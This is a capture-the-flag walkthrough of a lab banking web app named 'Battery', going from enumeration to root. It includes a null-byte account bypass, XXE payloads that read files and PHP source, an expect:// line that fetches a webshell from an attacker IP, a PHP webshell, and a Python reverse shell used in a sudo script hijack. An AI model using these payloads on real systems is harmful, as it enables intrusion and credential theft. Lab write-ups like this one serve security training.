# Battery - Medium

* Add ```battery.thm``` to ```/etc/hosts``` and scan using ```nmap``` - ```nmap -T4 -p- -A -Pn -v battery.thm```:

  * 22/tcp - ssh - OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
  * 80/tcp - http - Apache httpd 2.4.7 ((Ubuntu))

* On port 80, the webpage itself does not give any clue, so we would have to enumerate from our end:

  ```sh
  gobuster dir -u http://battery.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # directory scanning

  ffuf -c -u "http://battery.thm" -H "Host: FUZZ.battery.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 25
  # subdomain enumeration

  ffuf -c -u "http://battery.thm" -H "Host: FUZZ.battery.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 25 -fs 406 -s
  # filtering false positives

  gobuster vhost -u http://battery.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
  # vhost enumeration
  ```

* Directory enumeration gives us several pages:

  * /index.html
  * /register.php
  * /admin.php
  * /scripts
  * /forms.php
  * /report
  * /acc.php

* /register.php is a registration page with fields for username, bank name (ABC or DEF) and password; /admin.php is a login page

* /scripts contains 3 JS scripts and a subfolder /ie, which leads to a page saying 'TEST'

* Navigating to /forms.php shows a pop-up saying only admins can access the page, and for a split-second we are able to see a dashboard of sorts, before redirecting to /index.html. A similar pattern is seen with /acc.php

* /report gives a file - we can check this further:

  ```sh
  file report
  # it seems to be a binary

  chmod +x report

  ./report
  # asks for username and password
  # we can try with test creds but it does not work

  strings -n 6 report | less
  ```

* From ```strings``` analysis of the binary, it seems to be a binary for checking the bank management system. We have some user operations available as options. Furthermore, list of users include:

  * Guest
  * <admin@bank.a>
  * <support@bank.a>
  * <contact@bank.a>
  * <cyber@bank.a>
  * <admins@bank.a>
  * <sam@bank.a>
  * <super_user@bank.a>
  * <control_admin@bank.a>
  * <it_admin@bank.a>

* Navigating back to /register.php, we can create a mock account and login in /admin.php. This leads us to a dashboard view - we have options to withdraw, deposit and transfer money.

* There are 2 other tabs - My Account and command - when we click on both, we get the same pop-up as before, saying only admins are allowed to access this page

* The 'report' binary can be further inspected in Ghidra, where we find the following:

  * The function 'update()' mentions <admin@bank.a>, a string comparison and the strings 'Password updated successfully!' and 'Sorry you can't update the password'. This indicates only <admin@bank.a> user can update their password

  * List of users is same as what was found from ```strings``` earlier

  * We can navigating to Symbol Tree > Functions > ```main``` to view the code for the function. Here, we can see 'guest:guest' credentials work, but not all options are available to use

  * We can also view the other functions this way

* We can use the above info and try to register/login as <admin@bank.a> first:

  * In /register.php, when we enter username 'admin', bank 'a', and any password, we get a pop-up 'Nope you are wasting your time' - we have to try another approach

  * In /admin.php, which is the login page, we can try 'admin' and 'password', but it does not work; username <admin@bank.a> also does not work

  * We can try basic SQLi like adding quotes in the field but it still gives us the popup

  * We can intercept further requests using Burp Suite to modify the fields

  * Back to /register.php, since we still want to login as <admin@bank.a>, if we try adding a null byte ```%00``` at end of username, to make it 'admin%40bank.a%00', we can see it bypasses the checks and we get the successful message

  * Now, we can login to /admin.php using the username 'admin%40bank.a' and the previously set password - no need to set null byte this time

* Once we login as <admin@bank.a>, we can access the /acc.php and /forms.php pages

* When we submit some data for /acc.php, we get a pop-up saying 'RCE detected' and we are logged out of the page; we will need to login again like before

* When intercepting the request for /forms.php, we can see the data is sent in XML format; we can forward the request to Repeater and attempt XXE injection here:

  * Sending some sample data in /forms.php shows us the XML format in which data is sent:

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
      <root>
        <name>
          20
        </name>
        <search>
          message
        </search>
      </root>
    ```
  
  * Currently, we see a message at the bottom of the page - 'Sorry, account number is not active!'

  * To test if the page is vulnerable to XXE injection, we can send the following XML data, which includes an XML entity:

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE name [
      <!ENTITY xxe "XXE Test">
    ]>
      <root>
        <name>
          &xxe;
        </name>
        <search>
          message
        </search>
      </root>
    ```

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE message [
      <!ENTITY xxe "XXE Test">
    ]>
      <root>
        <name>
          20
        </name>
        <search>
          &xxe;
        </search>
      </root>
    ```
  
  * The second variation, in which the 'xxe' entity is referenced in 'search' parameter - we see the string "XXE Test" in response. If the web app was not vulnerable, we should simply see '&xxe;' string in response

  * As we now know 'search' parameter is vulnerable to XXE with internal entity, we can further exploit this with external entity:

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE message [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
      <root>
        <name>
          20
        </name>
        <search>
          &xxe;
        </search>
      </root>
    ```
  
  * This also works, and we can see the ```/etc/passwd``` file, which includes users named 'cyber' and 'yash'

  * We can try for RCE now - this requires the PHP ```expect``` module to be installed & enabled (```$IFS``` is used for spaces to avoid breaking XML format):

    ```sh
    echo '<?php system($_REQUEST["cmd"]);?>' > webshell.php

    python3 -m http.server 8000
    ```

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE message [
      <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'10.10.223.78:8000/webshell.php'">
    ]>
      <root>
        <name>
          20
        </name>
        <search>
          &xxe;
        </search>
      </root>
    ```
  
  * This does not work, so we will have to continue with reading files remotely

  * For reading the source code, ```file:///``` operations do not work as they may not be in XML format; for such cases, we can use wrapper filters to encode in base64 (only for PHP apps):

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE message [
      <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=forms.php">
    ]>
      <root>
        <name>
          20
        </name>
        <search>
          &xxe;
        </search>
      </root>
    ```
  
  * We can decode the base64 text in response to get source code for 'forms.php'; we can do the same for other pages as well

  * From the source code for 'with.php', we get MySQL creds 'root:idkpass' (same used in other pages as well)

  * Furthermore, in source code of 'acc.php', a comment is included which gives us the creds "cyber:super#secure&password!"

  * Also, source code of 'admin.php' contains a comment saying that creds for the 'admin' are saved in a file; we can search for this later

* Using the creds found from the source code, we can give SSH login a try:

  ```sh
  ssh cyber@battery.thm
  # this works

  cat flag1.txt
  # base flag

  # we can test the mysql creds from earlier
  mysql -u root -p
  # enter 'idkpass' as password

  # we are able to login
  show databases;

  # enumerate the database
  use details;

  show tables;

  # we have a users table
  select * from users;
  # this gives us some creds like "cyber:cyber", "admin@bank.a:I_know_my_password", "admin:pass" and "check:check"
  
  # nothing else is there so leaving mysql
  quit

  ls -la
  # we have a Python script here
  # owned by root
  # we do not have view permission

  less run.py

  sudo -l
  # this shows we can run the following as root
  # (root) NOPASSWD: /usr/bin/python3 /home/cyber/run.py

  sudo /usr/bin/python3 /home/cyber/run.py
  # this prints a message
  # Hey Cyber I have tested all the main components of our web server but something unusal happened from my end!

  ls -la run.py
  ```

* Now, for 'run.py', we do not have the required 'rwx' permissions, but we have the privilege to run this as sudo. As this resides in our home directory, we can remove this file and create a new file with same name to get root shell:

  ```sh
  rm run.py

  # in attacker machine
  nc -nvlp 4444

  # in victim ssh, write reverse shell
  echo 'import os,pty,socket;s=socket.socket();s.connect(("10.10.223.78",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")' > run.py

  sudo /usr/bin/python3 /home/cyber/run.py
  # we get reverse shell as root on listener

  # get flag2.txt from /home/yash and root.txt from /root
  ```
